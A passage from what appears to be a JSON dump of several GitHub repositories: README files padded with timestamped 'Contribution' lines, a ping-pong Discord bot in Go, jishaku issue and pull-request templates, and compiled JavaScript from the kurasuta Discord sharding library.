20:11\n\nContribution: 2022-10-13 20:12\n\nContribution: 2022-10-14 20:00\n\nContribution: 2022-10-14 20:01\n\nContribution: 2022-10-14 20:02\n\nContribution: 2022-10-14 20:03\n\nContribution: 2022-10-16 20:00\n\nContribution: 2022-10-16 20:01\n\nContribution: 2022-10-16 20:02\n\nContribution: 2022-10-17 20:00\n\nContribution: 2022-10-17 20:01\n\nContribution: 2022-10-17 20:02\n\nContribution: 2022-10-17 20:03\n\nContribution: 2022-10-17 20:04\n\nContribution: 2022-10-17 20:05\n\nContribution: 2022-10-17 20:06\n\nContribution: 2022-10-17 20:07\n\nContribution: 2022-10-17 20:08\n\nContribution: 2022-10-17 20:09\n\nContribution: 2022-10-19 20:00\n\nContribution: 2022-10-20 20:00\n\nContribution: 2022-10-20 20:01\n\nContribution: 2022-10-20 20:02\n\nContribution: 2022-10-20 20:03\n\nContribution: 2022-10-20 20:04\n\nContribution: 2022-10-20 20:05\n\nContribution: 2022-10-20 20:06\n\nContribution: 2022-10-20 20:07\n\nContribution: 2022-10-20 20:08\n\nContribution: 2022-10-20 20:09\n\nContribution: 2022-10-20 20:10\n\nContribution: 2022-10-20 20:11\n\nContribution: 2022-10-20 20:12\n\nContribution: 2022-10-20 20:13\n\nContribution: 2022-10-20 20:14\n\nContribution: 2022-10-21 20:00\n\nContribution: 2022-10-21 20:01\n\nContribution: 2022-10-21 20:02\n\n"
        }
    },
    "go_discord_bot": {
        "README.md": {
            "code": "# go_discord_bot\n idk\n"
        },
        "main.go": {
            "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/signal\"\n\t\"syscall\"\n\n\t\"github.com/bwmarrin/discordgo\"\n)\n\nfunc main() {\n\t// Create a new Discord session using the bot token.\n\tdg, err := discordgo.New(\"Bot \" + BOT_TOKEN)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating Discord session:\", err)\n\t\treturn\n\t}\n\n\t// Add a message handler for the \"messageCreate\" event.\n\tdg.AddHandler(messageCreate)\n\n\t// Open a websocket connection to Discord and begin listening for events.\n\terr = dg.Open()\n\tif err != nil {\n\t\tfmt.Println(\"Error opening connection:\", err)\n\t\treturn\n\t}\n\n\t// Wait here until CTRL-C or other term signal is received.\n\tfmt.Println(\"Bot is now running. Press CTRL-C to exit.\")\n\tsc := make(chan os.Signal, 1)\n\tsignal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)\n\t<-sc\n\n\t// Cleanly close down the Discord session.\n\tdg.Close()\n}\n\nfunc messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {\n\t// Ignore messages from bots and our own messages.\n\tif m.Author.Bot || m.Author.ID == s.State.User.ID {\n\t\treturn\n\t}\n\n\t// Respond to a user's message.\n\tif m.Content == \"ping\" {\n\t\ts.ChannelMessageSend(m.ChannelID, \"pong\")\n\t}\n}\n"
        }
    },
    "groot-logo": {
        "README.md": {
            "code": "# groot-logo"
        }
    },
    "idk": {
        "README.md": {
            "code": "Contribution: 2022-08-23 20:00\n\nContribution: 2022-08-23 20:01\n\nContribution: 2022-08-23 20:02\n\nContribution: 2022-08-23 20:03\n\nContribution: 2022-08-23 20:04\n\nContribution: 2022-08-23 20:05\n\nContribution: 2022-08-23 20:06\n\nContribution: 2022-08-23 20:07\n\nContribution: 2022-08-23 20:08\n\nContribution: 2022-08-23 20:09\n\nContribution: 2022-08-24 20:00\n\nContribution: 2022-08-24 20:01\n\nContribution: 2022-08-24 20:02\n\nContribution: 2022-08-24 20:03\n\nContribution: 2022-08-24 20:04\n\nContribution: 2022-08-24 20:05\n\nContribution: 2022-08-26 20:00\n\nContribution: 2022-08-26 20:01\n\nContribution: 2022-08-26 20:02\n\nContribution: 2022-08-26 20:03\n\nContribution: 2022-08-26 20:04\n\nContribution: 2022-08-26 20:05\n\nContribution: 2022-08-28 20:00\n\nContribution: 2022-08-28 20:01\n\nContribution: 2022-08-28 20:02\n\nContribution: 2022-08-28 20:03\n\nContribution: 2022-08-28 20:04\n\nContribution: 2022-08-28 20:05\n\nContribution: 2022-08-28 20:06\n\nContribution: 2022-08-28 20:07\n\nContribution: 2022-08-28 20:08\n\nContribution: 2022-08-29 20:00\n\nContribution: 2022-08-29 20:01\n\nContribution: 2022-08-29 20:02\n\nContribution: 2022-09-01 20:00\n\nContribution: 2022-09-01 20:01\n\nContribution: 2022-09-01 20:02\n\nContribution: 2022-09-01 20:03\n\nContribution: 2022-09-01 20:04\n\nContribution: 2022-09-03 20:00\n\nContribution: 2022-09-03 20:01\n\nContribution: 2022-09-03 20:02\n\nContribution: 2022-09-03 20:03\n\nContribution: 2022-09-03 20:04\n\nContribution: 2022-09-03 20:05\n\nContribution: 2022-09-03 20:06\n\nContribution: 2022-09-03 20:07\n\nContribution: 2022-09-04 20:00\n\nContribution: 2022-09-04 20:01\n\nContribution: 2022-09-05 20:00\n\nContribution: 2022-09-05 20:01\n\nContribution: 2022-09-05 20:02\n\nContribution: 2022-09-05 20:03\n\nContribution: 2022-09-05 20:04\n\nContribution: 2022-09-05 20:05\n\nContribution: 2022-09-05 20:06\n\nContribution: 2022-09-05 20:07\n\nContribution: 2022-09-05 20:08\n\nContribution: 2022-09-05 20:09\n\nContribution: 2022-09-05 20:10\n\nContribution: 2022-09-05 20:11\n\nContribution: 2022-09-07 20:00\n\nContribution: 2022-09-07 20:01\n\nContribution: 2022-09-07 20:02\n\nContribution: 2022-09-07 20:03\n\nContribution: 2022-09-08 20:00\n\nContribution: 2022-09-08 20:01\n\nContribution: 2022-09-08 20:02\n\nContribution: 2022-09-08 20:03\n\nContribution: 2022-09-08 20:04\n\nContribution: 2022-09-08 20:05\n\nContribution: 2022-09-09 20:00\n\nContribution: 2022-09-12 20:00\n\nContribution: 2022-09-15 20:00\n\nContribution: 2022-09-15 20:01\n\nContribution: 2022-09-15 20:02\n\nContribution: 2022-09-15 20:03\n\nContribution: 2022-09-15 20:04\n\nContribution: 2022-09-15 20:05\n\nContribution: 2022-09-15 20:06\n\nContribution: 2022-09-15 20:07\n\nContribution: 2022-09-15 20:08\n\nContribution: 2022-09-15 20:09\n\nContribution: 2022-09-15 20:10\n\nContribution: 2022-09-16 20:00\n\nContribution: 2022-09-16 20:01\n\nContribution: 2022-09-16 20:02\n\nContribution: 2022-09-16 20:03\n\nContribution: 2022-09-16 20:04\n\nContribution: 2022-09-16 20:05\n\nContribution: 2022-09-16 20:06\n\nContribution: 2022-09-16 20:07\n\nContribution: 2022-09-17 20:00\n\nContribution: 2022-09-17 20:01\n\nContribution: 2022-09-17 20:02\n\nContribution: 2022-09-18 20:00\n\nContribution: 2022-09-18 20:01\n\nContribution: 2022-09-18 20:02\n\nContribution: 2022-09-18 20:03\n\nContribution: 2022-09-20 20:00\n\nContribution: 2022-09-20 20:01\n\nContribution: 2022-09-20 20:02\n\nContribution: 2022-09-20 20:03\n\nContribution: 2022-09-20 20:04\n\nContribution: 2022-09-20 20:05\n\nContribution: 2022-09-22 20:00\n\nContribution: 2022-09-22 20:01\n\nContribution: 2022-09-22 20:02\n\nContribution: 2022-09-22 20:03\n\nContribution: 2022-09-22 20:04\n\nContribution: 2022-09-22 20:05\n\nContribution: 2022-09-22 20:06\n\nContribution: 2022-09-22 20:07\n\nContribution: 2022-09-23 20:00\n\nContribution: 2022-09-23 20:01\n\nContribution: 2022-09-23 20:02\n\nContribution: 2022-09-23 20:03\n\nContribution: 2022-09-23 20:04\n\nContribution: 2022-09-23 20:05\n\nContribution: 2022-09-24 20:00\n\nContribution: 2022-09-24 20:01\n\nContribution: 2022-09-24 20:02\n\nContribution: 2022-09-24 20:03\n\nContribution: 2022-09-24 20:04\n\nContribution: 2022-09-24 20:05\n\nContribution: 2022-09-24 20:06\n\nContribution: 2022-09-24 20:07\n\nContribution: 2022-09-26 20:00\n\nContribution: 2022-09-26 20:01\n\nContribution: 2022-09-28 20:00\n\nContribution: 2022-09-28 20:01\n\nContribution: 2022-09-28 20:02\n\nContribution: 2022-09-28 20:03\n\nContribution: 2022-09-28 20:04\n\nContribution: 2022-09-28 20:05\n\nContribution: 2022-09-28 20:06\n\nContribution: 2022-09-28 20:07\n\nContribution: 2022-09-28 20:08\n\nContribution: 2022-09-28 20:09\n\nContribution: 2022-09-28 20:10\n\nContribution: 2022-09-30 20:00\n\nContribution: 2022-09-30 20:01\n\nContribution: 2022-09-30 20:02\n\nContribution: 2022-09-30 20:03\n\nContribution: 2022-09-30 20:04\n\nContribution: 2022-09-30 20:05\n\nContribution: 2022-09-30 20:06\n\nContribution: 2022-09-30 20:07\n\nContribution: 2022-09-30 20:08\n\nContribution: 2022-09-30 20:09\n\nContribution: 2022-09-30 20:10\n\nContribution: 2022-10-01 20:00\n\nContribution: 2022-10-01 20:01\n\nContribution: 2022-10-01 20:02\n\nContribution: 2022-10-01 20:03\n\nContribution: 2022-10-01 20:04\n\nContribution: 2022-10-01 20:05\n\nContribution: 2022-10-01 20:06\n\nContribution: 2022-10-01 20:07\n\nContribution: 2022-10-01 20:08\n\nContribution: 2022-10-01 20:09\n\nContribution: 2022-10-02 20:00\n\nContribution: 2022-10-02 20:01\n\nContribution: 2022-10-02 20:02\n\nContribution: 2022-10-02 20:03\n\nContribution: 2022-10-02 20:04\n\nContribution: 2022-10-02 20:05\n\nContribution: 2022-10-02 20:06\n\nContribution: 2022-10-02 20:07\n\nContribution: 2022-10-02 20:08\n\nContribution: 2022-10-02 20:09\n\nContribution: 2022-10-04 20:00\n\nContribution: 2022-10-04 20:01\n\nContribution: 2022-10-05 20:00\n\nContribution: 2022-10-05 20:01\n\nContribution: 2022-10-05 20:02\n\nContribution: 2022-10-06 20:00\n\nContribution: 2022-10-06 20:01\n\nContribution: 2022-10-06 20:02\n\nContribution: 2022-10-06 20:03\n\nContribution: 2022-10-06 20:04\n\nContribution: 2022-10-06 20:05\n\nContribution: 2022-10-06 20:06\n\nContribution: 2022-10-06 20:07\n\nContribution: 2022-10-07 20:00\n\nContribution: 2022-10-07 20:01\n\nContribution: 2022-10-07 20:02\n\nContribution: 2022-10-07 20:03\n\nContribution: 2022-10-07 20:04\n\nContribution: 2022-10-07 20:05\n\nContribution: 2022-10-07 20:06\n\nContribution: 2022-10-08 20:00\n\nContribution: 2022-10-08 20:01\n\nContribution: 2022-10-08 20:02\n\nContribution: 2022-10-08 20:03\n\nContribution: 2022-10-08 20:04\n\nContribution: 2022-10-08 20:05\n\nContribution: 2022-10-08 20:06\n\nContribution: 2022-10-08 20:07\n\nContribution: 2022-10-09 20:00\n\nContribution: 2022-10-09 20:01\n\nContribution: 2022-10-09 20:02\n\nContribution: 2022-10-09 20:03\n\nContribution: 2022-10-09 20:04\n\nContribution: 2022-10-09 20:05\n\nContribution: 2022-10-09 20:06\n\nContribution: 2022-10-10 20:00\n\nContribution: 2022-10-10 20:01\n\nContribution: 2022-10-10 20:02\n\nContribution: 2022-10-10 20:03\n\nContribution: 2022-10-10 20:04\n\nContribution: 2022-10-10 20:05\n\nContribution: 2022-10-10 20:06\n\nContribution: 2022-10-10 20:07\n\nContribution: 2022-10-10 20:08\n\nContribution: 2022-10-10 20:09\n\nContribution: 2022-10-11 20:00\n\nContribution: 2022-10-11 20:01\n\nContribution: 2022-10-11 20:02\n\nContribution: 2022-10-11 20:03\n\nContribution: 2022-10-11 20:04\n\nContribution: 2022-10-12 20:00\n\nContribution: 2022-10-12 20:01\n\nContribution: 2022-10-12 20:02\n\nContribution: 2022-10-12 20:03\n\nContribution: 2022-10-12 20:04\n\nContribution: 2022-10-12 20:05\n\nContribution: 2022-10-12 20:06\n\nContribution: 2022-10-12 20:07\n\nContribution: 2022-10-12 20:08\n\nContribution: 2022-10-13 20:00\n\nContribution: 2022-10-13 20:01\n\nContribution: 2022-10-13 20:02\n\nContribution: 2022-10-13 20:03\n\nContribution: 2022-10-13 20:04\n\nContribution: 2022-10-13 20:05\n\nContribution: 2022-10-13 20:06\n\nContribution: 2022-10-13 20:07\n\nContribution: 2022-10-13 20:08\n\nContribution: 2022-10-13 20:09\n\nContribution: 2022-10-13 20:10\n\nContribution: 2022-10-13 20:11\n\nContribution: 2022-10-13 20:12\n\nContribution: 2022-10-13 20:13\n\nContribution: 2022-10-14 20:00\n\nContribution: 2022-10-14 20:01\n\nContribution: 2022-10-14 20:02\n\nContribution: 2022-10-14 20:03\n\nContribution: 2022-10-14 20:04\n\nContribution: 2022-10-14 20:05\n\nContribution: 2022-10-14 20:06\n\nContribution: 2022-10-14 20:07\n\nContribution: 2022-10-14 20:08\n\nContribution: 2022-10-14 20:09\n\nContribution: 2022-10-14 20:10\n\nContribution: 2022-10-14 20:11\n\nContribution: 2022-10-14 20:12\n\nContribution: 2022-10-15 20:00\n\nContribution: 2022-10-15 20:01\n\nContribution: 2022-10-15 20:02\n\nContribution: 2022-10-15 20:03\n\nContribution: 2022-10-15 20:04\n\nContribution: 2022-10-15 20:05\n\nContribution: 2022-10-15 20:06\n\nContribution: 2022-10-15 20:07\n\nContribution: 2022-10-16 20:00\n\nContribution: 2022-10-16 20:01\n\nContribution: 2022-10-16 20:02\n\nContribution: 2022-10-16 20:03\n\nContribution: 2022-10-16 20:04\n\nContribution: 2022-10-16 20:05\n\nContribution: 2022-10-16 20:06\n\nContribution: 2022-10-16 20:07\n\nContribution: 2022-10-16 20:08\n\nContribution: 2022-10-16 20:09\n\nContribution: 2022-10-16 20:10\n\nContribution: 2022-10-16 20:11\n\nContribution: 2022-10-16 20:12\n\nContribution: 2022-10-18 20:00\n\nContribution: 2022-10-18 20:01\n\nContribution: 2022-10-18 20:02\n\nContribution: 2022-10-18 20:03\n\nContribution: 2022-10-18 20:04\n\nContribution: 2022-10-21 20:00\n\nContribution: 2022-10-21 20:01\n\nContribution: 2022-10-21 20:02\n\nContribution: 2022-10-21 20:03\n\nContribution: 2022-10-21 20:04\n\nContribution: 2022-10-21 20:05\n\nContribution: 2022-10-21 20:06\n\nContribution: 2022-10-21 20:07\n\nContribution: 2022-10-21 20:08\n\nContribution: 2022-10-21 20:09\n\nContribution: 2022-10-21 20:10\n\n"
        }
    },
    "jishaku": {
        "BUG_REPORT.md": {
            "code": "---\nname: Bug Report\nabout: Report broken or incorrect behavior or functionality\n---\n\n## Summary\n\n<!-- A summary of your bug report -->\n\n## Reproduction steps\n\n<!-- Under what conditions does this bug occur? Is there a consistent method to reproduce the bug, and if so - what is it? If code is used in the reproduction process, please produce it here. -->\n\n## Expected results\n\n<!-- What you expected to occur as a result of your reproduction steps -->\n\n## Actual results\n\n<!-- What actually occurred as a result of your reproduction steps - i.e., the broken/incorrect behavior. -->\n\n## Checklist\n\n<!-- To check a box, place an x in the box (with no spaces), like so: [x] -->\n\n- [ ] I have updated discord.py and jishaku to the latest available versions and have confirmed that this issue is still present\n- [ ] I have searched the open issues for duplicates\n- [ ] I have shown the entire traceback, if possible\n- [ ] I have removed my token from display, if visible\n\n## System information\n\n<!-- Post information both about your jishaku AND discord.py version here -->\n<!-- You can get information about discord.py by running `python -m discord -v` -->\n<!-- You can get your jishaku version by running `pip show jishaku` -->\n"
        },
        "FEATURE_REQUEST.md": {
            "code": "---\nname: Feature Request\nabout: Suggest a feature for this library\n---\n\n## The Problem\n\n<!--\nWhat problem is your feature trying to solve? What becomes easier or possible when this feature is implemented?\n-->\n\n## The Ideal Solution\n\n<!--\nWhat is your ideal solution to the problem? What would you like this feature to do?\n-->\n\n## The Current Solution\n\n<!--\nWhat is the current solution to the problem, if any?\n-->\n\n## Summary\n\n<!-- A short summary of your feature request. -->\n"
        },
        "PULL_REQUEST_TEMPLATE.md": {
            "code": "## Rationale\n\n<!-- What is the reason behind this change? How does implementing it benefit end users or contributors? -->\n\n## Summary of changes made\n\n<!-- An explanation, in plain English, of your implementation of this change. -->\n\n## Checklist\n\n<!-- To check a box, place an x in the box (with no spaces), like so: [x] -->\n\n- [ ] This PR changes the jishaku module/cog codebase\n    - [ ] These changes add new functionality to the module/cog\n    - [ ] These changes fix an issue or bug in the module/cog\n    - [ ] I have tested that these changes work on a production bot codebase\n    - [ ] I have tested these changes against the CI/CD test suite\n    - [ ] I have updated the documentation to reflect these changes\n- [ ] This PR changes the CI/CD test suite\n    - [ ] I have tested my suite changes are well-formed (all tests can be discovered)\n    - [ ] These changes adjust existing test cases\n    - [ ] These changes add new test cases\n- [ ] This PR changes prose (such as the documentation, README or other Markdown/RST documents)\n    - [ ] I have proofread my changes for grammar and spelling issues\n    - [ ] I have tested that any changes regarding Markdown/RST syntax result in a well formed document\n"
        }
    },
    "kurasuta": {
        "README.md": {
            "code": "# kurasuta\n \n"
        },
        "BaseCluster.js": {
            "code": "\"use strict\";\nvar __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });\n}) : (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    o[k2] = m[k];\n}));\nvar __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {\n    Object.defineProperty(o, \"default\", { enumerable: true, value: v });\n}) : function(o, v) {\n    o[\"default\"] = v;\n});\nvar __importStar = (this && this.__importStar) || function (mod) {\n    if (mod && mod.__esModule) return mod;\n    var result = {};\n    if (mod != null) for (var k in mod) if (k !== \"default\" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);\n    __setModuleDefault(result, mod);\n    return result;\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.BaseCluster = void 0;\nconst ShardClientUtil_1 = require(\"../Sharding/ShardClientUtil\");\nconst Constants_1 = require(\"../Util/Constants\");\nconst Util = __importStar(require(\"../Util/Util\"));\nclass BaseCluster {\n    constructor(manager) {\n        this.manager = manager;\n        const env = process.env;\n        const shards = env.CLUSTER_SHARDS.split(',').map(Number);\n        const clientConfig = Util.mergeDefault(manager.clientOptions, {\n            shards,\n            shardCount: Number(env.CLUSTER_SHARD_COUNT)\n        });\n        this.client = new manager.client(clientConfig);\n        const client = this.client;\n        client.shard = new ShardClientUtil_1.ShardClientUtil(client, manager.ipcSocket);\n        this.id = Number(env.CLUSTER_ID);\n    }\n    async init() {\n        const shardUtil = this.client.shard;\n        await shardUtil.init();\n        this.client.once('ready', () => { void shardUtil.send({ op: Constants_1.IPCEvents.READY, d: this.id }, { receptive: false }); });\n        this.client.on('shardReady', id => { void shardUtil.send({ op: Constants_1.IPCEvents.SHARDREADY, d: { id: this.id, shardID: id } }, { receptive: false }); });\n        this.client.on('shardReconnecting', id => { void shardUtil.send({ op: Constants_1.IPCEvents.SHARDRECONNECT, d: { id: this.id, shardID: id } }, { receptive: false }); });\n        this.client.on('shardResume', (id, replayed) => { void shardUtil.send({ op: Constants_1.IPCEvents.SHARDRESUME, d: { id: this.id, shardID: id, replayed } }, { receptive: false }); });\n        this.client.on('shardDisconnect', ({ code, reason, wasClean }, id) => { void shardUtil.send({ op: Constants_1.IPCEvents.SHARDDISCONNECT, d: { id: this.id, shardID: id, closeEvent: { code, reason, wasClean } } }, { receptive: false }); });\n        await this.launch();\n    }\n}\nexports.BaseCluster = BaseCluster;\n\n//# sourceMappingURL=BaseCluster.js.map\n"
        },
        "Cluster.js": {
            "code": "\"use strict\";\nvar __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });\n}) : (function(o, m, k, k2) {\n    if (k2 === undefined) k2 = k;\n    o[k2] = m[k];\n}));\nvar __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {\n    Object.defineProperty(o, \"default\", { enumerable: true, value: v });\n}) : function(o, v) {\n    o[\"default\"] = v;\n});\nvar __importStar = (this && this.__importStar) || function (mod) {\n    if (mod && mod.__esModule) return mod;\n    var result = {};\n    if (mod != null) for (var k in mod) if (k !== \"default\" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);\n    __setModuleDefault(result, mod);\n    return result;\n};\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n    return (mod && mod.__esModule) ? mod : { \"default\": mod };\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.Cluster = void 0;\nconst cluster_1 = __importDefault(require(\"cluster\"));\nconst Constants_1 = require(\"../Util/Constants\");\nconst discord_js_1 = require(\"discord.js\");\nconst Util = __importStar(require(\"../Util/Util\"));\nconst events_1 = require(\"events\");\nclass Cluster extends events_1.EventEmitter {\n    constructor(options) {\n        super();\n        this.ready = false;\n        this.id = options.id;\n        this.shards = options.shards;\n        this.manager = options.manager;\n        this._exitListenerFunction = this._exitListener.bind(this);\n        this.once('ready', () => { this.ready = true; });\n    }\n    async eval(script) {\n        script = typeof script === 'function' ? `(${script})(this)` : script;\n        const { success, d } = await this.manager.ipc.server.sendTo(`Cluster ${this.id}`, { op: Constants_1.IPCEvents.EVAL, d: script });\n        if (!success)\n            throw discord_js_1.Util.makeError(d);\n        return d;\n    }\n    async fetchClientValue(prop) {\n        const { success, d } = await this.manager.ipc.server.sendTo(`Cluster ${this.id}`, { op: Constants_1.IPCEvents.EVAL, d: `this.${prop}` });\n        if (!success)\n            throw discord_js_1.Util.makeError(d);\n        return d;\n    }\n    kill() {\n        if (this.worker) {\n            this.manager.emit('debug', `Killing Cluster ${this.id}`);\n            this.worker.removeListener('exit', this._exitListenerFunction);\n            this.worker.kill();\n        }\n    }\n    async respawn(delay = 500) {\n        this.kill();\n        if (delay)\n            await Util.sleep(delay);\n        await this.spawn();\n    }\n    send(data) {\n        return this.manager.ipc.node.sendTo(`Cluster ${this.id}`, data);\n    }\n    async spawn() {\n        // eslint-disable-next-line @typescript-eslint/naming-convention\n        this.worker = cluster_1.default.fork(Object.assign({ CLUSTER_SHARDS: this.shards.join(','), CLUSTER_ID: this.id.toString(), CLUSTER_SHARD_COUNT: this.manager.shardCount.toString(), CLUSTER_CLUSTER_COUNT: this.manager.clusterCount.toString() }, process.env));\n        this.worker.once('exit', this._exitListenerFunction);\n        this.manager.emit('debug', `Worker spawned with id ${this.worker.id}`);\n        this.manager.emit('spawn', this);\n        await this._waitReady(this.shards.length);\n        await Util.sleep(5000);\n    }\n    _exitListener(code, signal) {\n        this.ready = false;\n        this.worker = undefined;\n        this.manager.emit('debug', `Worker exited with code ${code} and signal ${signal}${this.manager.respawn ? ', restarting...' : ''}`);\n        if (this.manager.respawn)\n            return this.respawn();\n    }\n    _waitReady(shardCount) {\n        return new Promise((resolve, reject) => {\n            this.once('ready', resolve);\n            setTimeout(() => reject(new Error(`Cluster ${this.id} took too long to get ready`)), (this.manager.timeout * shardCount) * (this.manager.guildsPerShard / 1000));\n        });\n    }\n}\nexports.Cluster = Cluster;\n\n//# sourceMappingURL=Cluster.js.map\n"
        },
        "ClusterIPC.js": {
            "code": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.ClusterIPC = void 0;\nconst events_1 = require(\"events\");\nconst veza_1 = require(\"veza\");\nconst discord_js_1 = require(\"discord.js\");\nconst Constants_1 = require(\"../Util/Constants\");\nclass ClusterIPC extends events_1.EventEmitter {\n    constructor(discordClient, id, socket) {\n        super();\n        this.id = id;\n        this.socket = socket;\n        this.client = discordClient;\n        this.node = new veza_1.Client(`Cluster ${this.id}`)\n            .on('error', error => this.emit('error', error))\n            .on('disconnect', client => this.emit('warn', `[IPC] Disconnected from ${client.name}`))\n            .on('ready', client => this.emit('debug', `[IPC] Connected to: ${client.name}`))\n            // eslint-disable-next-line @typescript-eslint/no-misused-promises\n            .on('message', this._message.bind(this));\n    }\n    async broadcast(script) {\n        script = typeof script === 'function' ? `(${script})(this)` : script;\n        const { success, d } = await this.server.send({ op: Constants_1.IPCEvents.BROADCAST, d: script });\n        if (!success)\n            throw discord_js_1.Util.makeError(d);\n        return d;\n    }\n    async masterEval(script) {\n        script = typeof script === 'function' ? `(${script})(this)` : script;\n        const { success, d } = await this.server.send({ op: Constants_1.IPCEvents.MASTEREVAL, d: script });\n        if (!success)\n            throw discord_js_1.Util.makeError(d);\n        return d;\n    }\n    async init() {\n        this.clientSocket = await this.node.connectTo(String(this.socket));\n    }\n    get server() {\n        return this.clientSocket;\n    }\n    _eval(script) {\n        return this.client._eval(script);\n    }\n    async _message(message) {\n        const { op, d } = message.data;\n        if (op === Constants_1.IPCEvents.EVAL) {\n            try {\n                message.reply({ success: true, d: await this._eval(d) });\n            }\n            catch (error) {\n                if (!(error instanceof Error))\n                    return;\n                message.reply({ success: false, d: { name: error.name, message: error.message, stack: error.stack } });\n            }\n        }\n    }\n}\nexports.ClusterIPC = ClusterIPC;\n\n//# sourceMappingURL=ClusterIPC.js.map\n"
        },
        "MasterIPC.js": {
            "code": "\"use strict\";\nvar __importDefault = (this && this.__importDefault) || function (mod) {\n    return (mod && mod.__esModule) ? mod : { \"default\": mod };\n};\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.MasterIPC = void 0;\nconst events_1 = require(\"events\");\nconst veza_1 = require(\"veza\");\nconst discord_js_1 = require(\"discord.js\");\nconst cluster_1 = __importDefault(require(\"cluster\"));\nconst Constants_1 = require(\"../Util/Constants\");\nclass MasterIPC extends events_1.EventEmitter {\n    constructor(manager) {\n        super();\n        this.manager = manager;\n        this.server = new veza_1.Server('Master')\n            .on('connect', client => this.emit('debug', `Client Connected: ${client.name}`))\n            .on('disconnect', client => this.emit('debug', `Client Disconnected: ${client.name}`))\n            .on('error', error => this.emit('error', error))\n            .on('message', this._incommingMessage.bind(this));\n        if (cluster_1.default.isPrimary)\n            void this.server.listen(manager.ipcSocket);\n    }\n    async broadcast(code) {\n        const data = await this.server.broadcast({ op: Constants_1.IPCEvents.EVAL, d: code });\n        let errored = data.filter(res => !res.success);\n        if (errored.length) {\n            errored = errored.map(msg => msg.d);\n            const error = errored[0];\n            throw discord_js_1.Util.makeError(error);\n        }\n        return data.map(res => res.d);\n    }\n    _incommingMessage(message) {\n        const { op } = message.data;\n        this[`_${Constants_1.IPCEvents[op].toLowerCase()}`](message);\n    }\n    _message(message) {\n        const { d } = message.data;\n        this.manager.emit(Constants_1.SharderEvents.MESSAGE, d);\n    }\n    async _broadcast(message) {\n        const { d } = message.data;\n        try {\n            const data = await this.broadcast(d);\n            message.reply({ success: true, d: data });\n        }\n        catch (error) {\n            if (!(error instanceof Error))\n                return;\n            message.reply({ success: false, d: { name: error.name, message: error.message, stack: error.stack } });\n        }\n    }\n    _ready(message) {\n        const { d: id } = message.data;\n        const cluster = this.manager.clusters.get(id);\n        cluster.emit('ready');\n        this._debug(`Cluster ${id} became ready`);\n        this.manager.emit(Constants_1.SharderEvents.READY, cluster);\n    }\n    _shardready(message) {\n        const { d: { shardID } } = message.data;\n        this._debug(`Shard ${shardID} became ready`);\n        this.manager.emit(Constants_1.SharderEvents.SHARD_READY, shardID);\n    }\n    _shardreconnect(message) {\n        const { d: { shardID } } = message.data;\n        this._debug(`Shard ${shardID} tries to reconnect`);\n        this.manager.emit(Constants_1.SharderEvents.SHARD_RECONNECT, shardID);\n    }\n    _shardresume(message) {\n        const { d: { shardID, replayed } } = message.data;\n        this._debug(`Shard ${shardID} resumed connection`);\n        this.manager.emit(Constants_1.SharderEvents.SHARD_RESUME, replayed, shardID);\n    }\n    _sharddisconnect(message) {\n        const { d: { shardID, closeEvent } } = message.data;\n        this._debug(`Shard ${shardID} disconnected!`);\n        this.manager.emit(Constants_1.SharderEvents.SHARD_DISCONNECT, closeEvent, shardID);\n    }\n    _restart(message) {\n        const { d: clusterID } = message.data;\n        return this.manager.restart(clusterID)\n            .then(() => message.reply({ success: true }))\n            .catch(error => message.reply({ success: false, d: { name: error.name, message: error.message, stack: error.stack } }));\n    }\n    async _mastereval(message) {\n        const { d } = message.data;\n        try {\n            const result = await this.manager.eval(d);\n            return message.reply({ success: true, d: result });\n        }\n        catch (error) {\n            if (!(error instanceof Error))\n                return;\n            return message.reply({ success: false, d: { name: error.name, message: error.message, stack: error.stack } });\n        }\n    }\n    async _restartall() {\n        await this.manager.restartAll();\n    }\n    async _fetchuser(message) {\n        return this._fetch(message, 'const user = this.users.cache.get(\\'{id}\\'); user ? user.toJSON() : user;');\n    }\n    async _fetchguild(message) {\n        return this._fetch(message, 'const guild = this.guilds.cache.get(\\'{id}\\'); guild ? guild.toJSON() : guild;');\n    }\n    _fetchchannel(message) {\n        return this._fetch(message, 'const channel = this.channels.cache.get(\\'{id}\\'); channel ? channel.toJSON() : channel;');\n    }\n    async _fetch(message, code) {\n        const { d: id } = message.data;\n        const result = await this.broadcast(code.replace('{id}', id));\n        const realResult = result.filter(r => r);\n        if (realResult.length) {\n            return message.reply({ success: true, d: realResult[0] });\n        }\n        return message.reply({ success: false });\n    }\n    _debug(message) {\n        this.emit(Constants_1.SharderEvents.DEBUG, message);\n    }\n}\nexports.MasterIPC = MasterIPC;\n\n//# sourceMappingURL=MasterIPC.js.map\n"
        },
        "ShardClientUtil.js": {
